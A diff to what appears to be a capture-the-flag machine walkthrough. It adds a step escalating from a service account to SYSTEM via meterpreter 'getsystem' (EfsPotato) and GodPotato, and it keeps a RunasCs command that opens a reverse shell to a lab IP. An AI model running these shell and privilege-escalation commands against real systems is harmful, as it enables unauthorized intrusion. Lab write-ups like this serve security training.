@@ -228,7 +228,18 @@ Get a reverse shell:
 .\RunasCs.exe svc_sql <REDACTED> cmd.exe -r 10.10.xx.xx:4445 --logon-type 5 --bypass-uac
 ```
 
-### Step 8 — Escalate to SYSTEM via GodPotato
+### Step 8 — Escalate to SYSTEM via GodPotato/meterpreter
+
+```bash
+meterpreter > getuid
+Server username: darkzero-ext\svc_sql
+meterpreter > getsystem
+...got system via technique 6 (Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)).
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+Since, we have SeImpersonate privilege, we can use meterpreter command 'getsystem' to escalate.
 
 ```powershell
 .\GodPotato-NET4.exe -cmd "whoami"
